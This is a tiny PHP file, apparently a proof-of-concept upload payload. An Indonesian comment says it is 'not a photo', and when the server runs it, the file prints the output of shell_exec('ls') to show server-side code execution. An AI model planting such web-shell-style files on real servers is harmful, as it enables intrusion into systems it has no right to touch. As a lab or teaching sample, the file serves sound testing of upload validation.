<?php
// berkas ini bukan foto
echo "<pre>Berkas ini dijalankan oleh server.\n\n$ ls\n" . shell_exec("ls") . "</pre>";
